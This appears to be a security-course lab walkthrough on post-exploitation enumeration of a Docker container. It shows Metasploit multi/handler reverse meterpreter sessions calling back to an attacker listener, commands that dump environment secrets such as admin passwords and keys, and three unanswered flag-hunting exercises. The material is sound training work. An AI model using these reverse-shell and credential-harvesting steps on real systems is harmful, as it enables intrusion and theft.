# Enumerating the Production Container

Interacting with the New Session
>``` shell
>msf6 exploit(multi/handler) > sessions
>
># ========== Expected Result ==========
>Active sessions
>===============
>
>  Id  Name  Type                      Information          Connection
>  --  ----  ----                      -----------          ----------
>  2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 -> 198.18.53.73:37604 (172.18.0.4)
># =====================================
>
>msf6 exploit(multi/handler) > sessions -i 2
>
># ========== Expected Result ==========
>[*] Starting interaction with 2...
># =====================================
>```

Reviewing Network Interfaces
>``` shell
>meterpreter > ifconfig
>
># ========== Expected Result ==========
>Interface  1
>============
>Name         : lo
>Hardware MAC : 00:00:00:00:00:00
>MTU          : 65536
>Flags        : UP LOOPBACK RUNNING
>IPv4 Address : 127.0.0.1
>IPv4 Netmask : 255.0.0.0
>
>Interface 41
>============
>Name         : eth1
>Hardware MAC : 02:42:ac:1e:00:03
>MTU          : 1500
>Flags        : UP BROADCAST RUNNING MULTICAST
>IPv4 Address : 172.30.0.3
>IPv4 Netmask : 255.255.0.0
>
>Interface 43
>============
>Name         : eth0
>Hardware MAC : 02:42:ac:12:00:04
>MTU          : 1500
>Flags        : UP BROADCAST RUNNING MULTICAST
>IPv4 Address : 172.18.0.4
>IPv4 Netmask : 255.255.0.0
># =====================================
>```

Checking User and Current Directory
>``` shell
>meterpreter > shell
>
>whoami
>
># ========== Expected Result ==========
>root
># =====================================
>
>ls -alh
>
># ========== Expected Result ==========
>total 32K
>drwxr-xr-x 1 root root  17 Jul  6 16:25 .
>drwxr-xr-x 1 root root  40 Jul  6 16:42 ..
>drwxr-xr-x 8 root root 162 Jul  6 16:41 .git
>-rw-r--r-- 1 root root 199 Jul  6 16:25 Dockerfile
>-rw-r--r-- 1 root root 15K Jul  6 16:25 README.md
>drwxr-xr-x 1 root root  52 Jul  6 16:42 app
>-rw-r--r-- 1 root root 167 Jul  6 16:25 pip.conf
>-rw-r--r-- 1 root root 196 Jul  6 16:25 requirements.txt
>-rw-r--r-- 1 root root 123 Jul  6 16:25 run.py
># =====================================
>```

Reviewing Mounts
>``` shell
>mount
>
># ========== Expected Result ==========
>overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/XSUOTVCMJALCFZC3RDKUMDRFT7:/var/lib/docker/overlay2/l/GZ2WZHEOX36F3NXSO3JL4BYD6L:/var/lib/docker/overlay2/l/HVQUSP32SJWVAJ3KOL2QASE4W3:/var/lib/docker/overlay2/l/HE7JGACHWIPRNCT54LBN6AXOZP:/var/lib/docker/overlay2/l/ESRP43XML3BVETNT2Z7I3N2JU4:/var/lib/docker/overlay2/l/KP435SVPCD3NIUYPJPVAREWOOZ:/var/lib/docker/overlay2/l/72FQOR2NP3DWJJSQEXIRCSYJLG:/var/lib/docker/overlay2/l/XGHOLK75NEJNWWWX6CXQOTPRVX:/var/lib/docker/overlay2/l/FYRGADRJGMIS5XK5SBKPLCX6BG:/var/lib/docker/overlay2/l/Z2X5KHFJNPU35ZKBGAHJUEZT3I:/var/lib/docker/overlay2/l/5QTAPW6XADCCWCTAVASPNQT7A4:/var/lib/docker/overlay2/l/35PKZCCO3U4ARBXXGICO35VEMU:/var/lib/docker/overlay2/l/J5J2DCSN4XC4G5HJ6VLPEB3KJL:/var/lib/docker/overlay2/l/D3NHOQ5FM57FMMCEBAT575CAVI:/var/lib/docker/overlay2/l/4BJ4Q3NJFA6VRGPHR4GYYFAB4T,upperdir=/var/lib/docker/overlay2/b95da9be18e4db9ea42697d255af877c65d441522e0f02f8a628239709573bfc/diff,workdir=/var/lib/docker/overlay2/b95da9be18e4db9ea42697d255af877c65d441522e0f02f8a628239709573bfc/work)
>proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
>tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
>...
># =====================================
>```

Reviewing Environment Variables
>``` shell
>printenv
>
># ========== Expected Result ==========
>HOSTNAME=6699d104d6c5
>SECRET_KEY=asdfasdfasdfasdf
>PYTHON_PIP_VERSION=22.3.1
>HOME=/root
>GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
>ADMIN_PASSWORD=password
>PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d5cb0afaf23b8520f1bbcfed521017b4a95f5c01/public/get-pip.py
>PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
>LANG=C.UTF-8
>SQLALCHEMY_TRACK_MODIFICATIONS=False
>PYTHON_VERSION=3.11.2
>PYTHON_SETUPTOOLS_VERSION=65.5.1
>PWD=/app
>PYTHON_GET_PIP_SHA256=394be00f13fa1b9aaa47e911bdb59a09c3b2986472130f30aa0bfaf7f3980637
>SQLALCHEMY_DATABASE_URI=sqlite:////data/data.db
>ADMIN_USERNAME=admin
># =====================================
>```

Closed and Reopened Meterpreter Sessions
>``` shell
>[*] 172.18.0.4 - Meterpreter session 2 closed.  Reason: Died
>
>[*] Sending stage (24772 bytes) to 198.18.53.73
>
>[*] Meterpreter session 3 opened (10.0.1.54:4488 -> 198.18.53.73:60146)
>
>msf6 exploit(multi/handler) > sessions -i 3
>
># ========== Expected Result ==========
>[*] Starting interaction with 3...
>
>meterpreter >
># =====================================
>```

Lab 1 - Discover the environment variable with the flag in the container.
>``` shell
>
>```
>

Lab 2 - According to /etc/os-release, what operating system is used for the production server?
>``` shell
>
>```
>

Lab 3 - Read the contents of the SQLite Database and find the flag in one of the links.
>``` shell
>
>```
>
